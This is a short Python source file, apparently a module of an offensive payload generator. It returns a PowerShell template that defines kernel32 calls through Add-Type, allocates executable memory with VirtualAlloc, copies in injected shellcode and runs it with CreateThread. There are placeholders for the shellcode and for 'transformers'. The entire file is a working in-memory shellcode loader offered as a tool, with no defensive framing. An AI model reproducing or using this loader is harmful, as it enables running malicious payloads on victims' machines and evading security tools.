class shellcoderunner:

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def template(self) -> str:
        return """
# Define the Win32 API signatures using .NET reflection

{imports}

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}}
"@

{codeblocks}

Add-Type -TypeDefinition $Kernel32 -ErrorAction SilentlyContinue

{shellcode}
{transformers}

$addr = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)

$threadId = [uint32]0
$hThread = [Kernel32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)

# 4. Wait for the thread to finish
[Kernel32]::WaitForSingleObject($hThread, 0xFFFFFFFFl)
"""